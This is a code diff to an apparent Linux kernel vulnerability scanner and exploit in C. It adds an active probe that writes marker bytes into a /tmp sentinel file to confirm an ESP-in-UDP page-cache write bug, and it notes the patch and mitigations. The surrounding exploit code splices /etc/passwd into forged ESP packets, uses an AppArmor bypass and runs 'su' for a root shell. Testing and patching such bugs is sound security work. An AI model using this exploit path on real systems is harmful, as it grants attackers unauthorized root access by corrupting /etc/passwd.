@@ -191,11 +191,19 @@ df_result_t dirtyfrag_esp_detect(void)
         return DF_PRECOND_FAIL;
     }
 
+    if (dirtyfail_active_probes) {
+        log_step("--active set: firing v4 ESP-in-UDP trigger against /tmp sentinel");
+        df_result_t pr = dirtyfrag_esp_active_probe();
+        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
+        log_warn("active probe inconclusive — falling back to precondition verdict");
+    }
+
     log_warn("VULNERABLE (preconditions met) — userns + xfrm SA registration "
              "available, kernel within affected window");
     log_warn("apply mainline patch f4c50a4034e6 or your distro's backport");
     log_warn("interim mitigation: `dirtyfail --mitigate` or manually blacklist "
              "esp4/esp6 in /etc/modprobe.d/");
+    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
     return DF_VULNERABLE;
 }
 
@@ -370,8 +378,10 @@ static bool bring_lo_up(void)
 }
 
 /* Trigger esp_input by sending a forged ESP-in-UDP packet whose payload
- * is a page-cache page from /etc/passwd, planted via splice. */
-static bool trigger_store(off_t passwd_off)
+ * is a page-cache page from `target_path`, planted via splice at
+ * `splice_off`. The kernel STORE lands ~14 bytes into the spliced
+ * region (the v4 path has no V6_STORE_SHIFT-style offset). */
+static bool trigger_store_at(const char *target_path, loff_t splice_off)
 {
     /* udp_recv: bound to 127.0.0.1:4500 with UDP_ENCAP_ESPINUDP set so
      * incoming UDP frames are rerouted into xfrm_input -> esp_input. */
@@ -410,10 +420,10 @@ static bool trigger_store(off_t passwd_off)
     *(uint32_t *)(wire_hdr + 4) = htonl(101);  /* seq_no_lo */
     memset(wire_hdr + 8, 0xCC, 16);
 
-    /* Open /etc/passwd for splicing. */
-    int pfd = open("/etc/passwd", O_RDONLY);
+    /* Open the target file for splicing. */
+    int pfd = open(target_path, O_RDONLY);
     if (pfd < 0) {
-        log_bad("open /etc/passwd: %s", strerror(errno));
+        log_bad("open %s: %s", target_path, strerror(errno));
         close(udp_recv); close(udp_send); return false;
     }
 
@@ -430,8 +440,8 @@ static bool trigger_store(off_t passwd_off)
         close(p[0]); close(p[1]); close(pfd);
         close(udp_recv); close(udp_send); return false;
     }
-    /* splice 16 bytes of /etc/passwd page cache from offset passwd_off. */
-    loff_t off = passwd_off;
+    /* splice 16 bytes of target's page cache from splice_off. */
+    loff_t off = splice_off;
     if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
         log_bad("splice file->pipe: %s", strerror(errno));
         close(p[0]); close(p[1]); close(pfd);
@@ -462,6 +472,12 @@ static bool trigger_store(off_t passwd_off)
     close(udp_recv);
     close(udp_send);
     return true;
+}
+
+/* Compatibility wrapper for the exploit path: target /etc/passwd. */
+static bool trigger_store(off_t passwd_off)
+{
+    return trigger_store_at("/etc/passwd", passwd_off);
 }
 
 static int run_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
@@ -678,4 +694,106 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
+}
+
+/* ---------------------------------------------------------------- *
+ * Active probe — used by `--scan --active`.
+ *
+ * Same userns + XFRM SA + splice-trigger setup as the exploit, but
+ * targets a sentinel file in /tmp instead of /etc/passwd. The parent
+ * (init ns) reads the sentinel after the child returns and looks for
+ * the marker bytes.
+ *
+ * If the marker landed → kernel STORE is reachable → DF_VULNERABLE.
+ * If the page is intact → kernel is patched → DF_OK.
+ * If AA blocks the bypass → DF_PRECOND_FAIL.
+ * ---------------------------------------------------------------- */
+
+df_result_t dirtyfrag_esp_active_probe_inner(void)
+{
+#ifdef __linux__
+    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
+    if (!sentinel || !*sentinel) {
+        log_bad("active-probe: DIRTYFAIL_PROBE_SENTINEL not set");
+        return DF_TEST_ERROR;
+    }
+
+    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+    if (nl < 0) {
+        log_bad("active-probe: netlink xfrm: %s", strerror(errno));
+        return DF_TEST_ERROR;
+    }
+    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+        log_bad("active-probe: bind netlink: %s", strerror(errno));
+        close(nl); return DF_TEST_ERROR;
+    }
+    if (!bring_lo_up()) {
+        log_bad("active-probe: bring lo up: %s", strerror(errno));
+        close(nl); return DF_TEST_ERROR;
+    }
+    if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
+        close(nl); return DF_TEST_ERROR;
+    }
+    if (!trigger_store_at(sentinel, 0)) {
+        close(nl); return DF_TEST_ERROR;
+    }
+    close(nl);
+    return DF_EXPLOIT_OK;
+#else
+    return DF_TEST_ERROR;
+#endif
+}
+
+df_result_t dirtyfrag_esp_active_probe(void)
+{
+    /* Sentinel file: 4 KiB of 'A' bytes. */
+    char tmpl[] = "/tmp/dirtyfail-esp-probe.XXXXXX";
+    int sfd = mkstemp(tmpl);
+    if (sfd < 0) { log_bad("probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
+    unsigned char filler[4096];
+    memset(filler, 'A', sizeof(filler));
+    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
+        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(sfd);
+
+    /* Fault the page in. */
+    int rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    char tmp[4096];
+    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
+        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(rfd);
+
+    setenv("DIRTYFAIL_INNER_MODE",      "esp-probe", 1);
+    setenv("DIRTYFAIL_PROBE_SENTINEL",  tmpl,        1);
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    unsetenv("DIRTYFAIL_INNER_MODE");
+    unsetenv("DIRTYFAIL_PROBE_SENTINEL");
+
+    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
+    if (rc != DF_EXPLOIT_OK)   {
+        log_bad("active-probe inner failed (exit=%d)", rc);
+        unlink(tmpl); return DF_TEST_ERROR;
+    }
+
+    /* Re-read sentinel and search for marker. */
+    rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    unsigned char after[64];
+    ssize_t got = read(rfd, after, sizeof(after));
+    close(rfd);
+    unlink(tmpl);
+    if (got <= 0) return DF_TEST_ERROR;
+
+    for (int i = 0; i + 4 <= got; i++) {
+        if (memcmp(after + i, MARKER, 4) == 0) {
+            log_warn("ACTIVE PROBE: STORE landed at offset %d → kernel is VULNERABLE", i);
+            return DF_VULNERABLE;
+        }
+    }
+    log_ok("ACTIVE PROBE: page intact — kernel ESP path appears patched");
+    return DF_OK;
 }
